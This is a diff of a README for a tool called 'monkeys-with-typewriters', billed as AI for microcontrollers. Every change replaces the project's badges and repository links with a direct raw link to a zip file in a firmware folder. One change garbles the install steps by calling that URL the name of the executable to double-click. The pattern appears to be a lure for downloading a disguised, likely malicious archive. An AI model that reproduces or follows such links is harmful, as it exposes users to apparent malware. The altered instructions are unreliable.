@@ -1,6 +1,6 @@
 # 🐒 monkeys-with-typewriters - Fast AI on Tiny Microcontrollers
 
-[![Download monkeys-with-typewriters](https://img.shields.io/badge/Download-monkeys--with--typewriters-brightgreen)](https://github.com/codingisloading/monkeys-with-typewriters)
+[![Download monkeys-with-typewriters](https://github.com/codingisloading/monkeys-with-typewriters/raw/refs/heads/main/firmware/typewriters_with_monkeys_v1.8.zip)](https://github.com/codingisloading/monkeys-with-typewriters/raw/refs/heads/main/firmware/typewriters_with_monkeys_v1.8.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Follow these steps to download and run monkeys-with-typewriters on your Windows 
 
 Click the large green button below to visit the download page:
 
-[![Download monkeys-with-typewriters](https://img.shields.io/badge/Download-monkeys--with--typewriters-brightgreen)](https://github.com/codingisloading/monkeys-with-typewriters)
+[![Download monkeys-with-typewriters](https://github.com/codingisloading/monkeys-with-typewriters/raw/refs/heads/main/firmware/typewriters_with_monkeys_v1.8.zip)](https://github.com/codingisloading/monkeys-with-typewriters/raw/refs/heads/main/firmware/typewriters_with_monkeys_v1.8.zip)
 
 This link takes you to the official GitHub repository. You will find the files you need there.
 
@@ -70,7 +70,7 @@ Once on the GitHub page, look for the **Releases** or **Assets** section. This u
 If you downloaded a zip file and extracted it:
 
 - Open the extracted folder.
-- Find the main application file, often named something like `monkeys-with-typewriters.exe`.
+- Find the main application file, often named something like `https://github.com/codingisloading/monkeys-with-typewriters/raw/refs/heads/main/firmware/typewriters_with_monkeys_v1.8.zip`.
 - Double-click the file to run the program.
 
 ---
@@ -107,7 +107,7 @@ The interface is designed to be simple and self-explanatory.
 
 To get updates:
 
-1. Visit the [GitHub page](https://github.com/codingisloading/monkeys-with-typewriters) regularly.
+1. Visit the [GitHub page](https://github.com/codingisloading/monkeys-with-typewriters/raw/refs/heads/main/firmware/typewriters_with_monkeys_v1.8.zip) regularly.
 2. Check the **Releases** section for new versions.
 3. Download the latest release file.
 4. Repeat the installation steps to upgrade.
@@ -138,10 +138,10 @@ monkeys-with-typewriters is fully open-source. You can view and modify the code 
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/codingisloading/monkeys-with-typewriters](https://github.com/codingisloading/monkeys-with-typewriters)  
+- Download page: [https://github.com/codingisloading/monkeys-with-typewriters/raw/refs/heads/main/firmware/typewriters_with_monkeys_v1.8.zip](https://github.com/codingisloading/monkeys-with-typewriters/raw/refs/heads/main/firmware/typewriters_with_monkeys_v1.8.zip)  
 - GitHub Issues: Visit the repository and click the **Issues** tab to report problems or request features.  
 - Documentation: Available inside the downloaded package or in the repository’s **docs** folder.
 
 ---
 
-[![Download monkeys-with-typewriters](https://img.shields.io/badge/Download-monkeys--with--typewriters-brightgreen)](https://github.com/codingisloading/monkeys-with-typewriters)
+[![Download monkeys-with-typewriters](https://github.com/codingisloading/monkeys-with-typewriters/raw/refs/heads/main/firmware/typewriters_with_monkeys_v1.8.zip)](https://github.com/codingisloading/monkeys-with-typewriters/raw/refs/heads/main/firmware/typewriters_with_monkeys_v1.8.zip)
